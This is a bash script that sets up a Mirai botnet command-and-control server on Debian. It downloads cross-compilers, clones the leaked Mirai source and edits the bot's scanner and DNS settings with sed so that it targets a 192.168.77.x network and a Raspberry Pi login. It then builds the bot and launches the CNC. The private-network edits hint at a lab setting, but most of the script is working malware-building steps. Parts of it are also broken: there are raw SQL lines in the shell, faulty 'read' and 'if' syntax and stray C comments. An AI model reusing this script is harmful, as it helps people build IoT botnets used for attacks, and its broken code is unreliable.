#!/bin/bash
# Description: This script will setup a mirai cnc on a debian 64-bit (run with sudo)
# Author: Christina Skouloudi
# Year: 2017

apt-get update -y
apt-get upgrade -y
apt-get install gcc golang electric-fence sudo git -y
apt-get install mysql-server mysql-client -y
 
mkdir /etc/xcompile
cd /etc/xcompile
 
wget https://www.uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-armv4l.tar.bz2
wget https://www.uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-i586.tar.bz2
wget https://www.uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-m68k.tar.bz2
wget https://www.uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-mips.tar.bz2
wget https://www.uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-mipsel.tar.bz2
wget https://www.uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-powerpc.tar.bz2
wget https://www.uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-sh4.tar.bz2
wget https://www.uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-sparc.tar.bz2
wget http://distro.ibiblio.org/slitaz/sources/packages/c/cross-compiler-armv6l.tar.bz2

tar -jxf cross-compiler-armv4l.tar.bz2
tar -jxf cross-compiler-i586.tar.bz2
tar -jxf cross-compiler-m68k.tar.bz2
tar -jxf cross-compiler-mips.tar.bz2
tar -jxf cross-compiler-mipsel.tar.bz2
tar -jxf cross-compiler-powerpc.tar.bz2
tar -jxf cross-compiler-sh4.tar.bz2
tar -jxf cross-compiler-sparc.tar.bz2
tar -jxf cross-compiler-armv6l.tar.bz2
 
rm *.tar.bz2
mv cross-compiler-armv4l armv4l
mv cross-compiler-i586 i586
mv cross-compiler-m68k m68k
mv cross-compiler-mips mips
mv cross-compiler-mipsel mipsel
mv cross-compiler-powerpc powerpc
mv cross-compiler-sh4 sh4
mv cross-compiler-sparc sparc
mv cross-compiler-armv6l armv6l

export PATH=$PATH:/etc/xcompile/armv4l/bin
export PATH=$PATH:/etc/xcompile/armv6l/bin
export PATH=$PATH:/etc/xcompile/i586/bin
export PATH=$PATH:/etc/xcompile/m68k/bin
export PATH=$PATH:/etc/xcompile/mips/bin
export PATH=$PATH:/etc/xcompile/mipsel/bin
export PATH=$PATH:/etc/xcompile/powerpc/bin
export PATH=$PATH:/etc/xcompile/powerpc-440fp/bin
export PATH=$PATH:/etc/xcompile/sh4/bin
export PATH=$PATH:/etc/xcompile/sparc/bin
export PATH=$PATH:/etc/xcompile/armv6l/bin
 
export PATH=$PATH:/usr/local/go/bin
export GOPATH=$HOME/Documents/go

cd ../../
go get github.com/go-sql-driver/mysql
go get github.com/mattn/go-shellwords

cd
git clone https://github.com/jgamblin/Mirai-Source-Code
cd Mirai-Source-Code/mirai

# mirai/bot/scanner.c contains list of ip’s (ipv4_t get_random_ip(void); - delete them. 
sed -i -e '/ while (o1 == 127 /,+13d' ~/mirai/Mirai-Source-Code/mirai/bot/scanner.c
// still have to erase do {}

#TODO:
# replace pi\/raspberry with smth like add_auth_entry("\x4F\x4D\x56\x4A\x47\x50", "\x44\x57\x41\x49\x47\x50", 1);
sed -i '/add_auth_entry("\x4F\x4D\x56\x4A\x47\x50", "\x44\x57\x41\x49\x47\x50", 1); \/\/ mother   fucker/a "here goes the pi\/raspberry passwd"'  ~/mirai/Mirai-Source-Code/mirai/bot/scanner.c
sed -i -e 's/return INET_ADDR(o1,o2,o3,o4);/return INET_ADDR(192,168,77,o4);/g' ~/mirai/Mirai-Source-Code/mirai/bot/scanner.c

# change dns server to the ip of the AP (interface to rest of clients) in mirai/bot/resolv.c 
sed -i -e 's/addr.sin_addr.s_addr = INET_ADDR(8,8,8,8);/addr.sin_addr.s_addr = INET_ADDR(192,168,77,1);/g' ~/mirai/Mirai-Source-Code/mirai/bot/resolv.c

echo -e "Please give the domain name of the CNC"
read $domainname 

./build.sh debug telnet
./debug/enc string $domainname
# TODO: add this output to table.c file

# TODO: if iptables in place do service iptables stop && /etc/ini.d/iptbales stop

# mysql commands
create database mirai;
use mirai;
# load sql script mirai.sql (source: http://pastebin.com/BsSWnK7i) - HERE change creds
mysql -u root -p root < mirai.sql

# TODO: set the credentials you used in the ./cnc/main.go file. It should look like this - http://prntscr.com/dnskj5

service mysql restart
cd release
echo "Do you want to start running your cnc instance? Yes or No"
read $answer 
if $answer=="Yes" then ./cnc
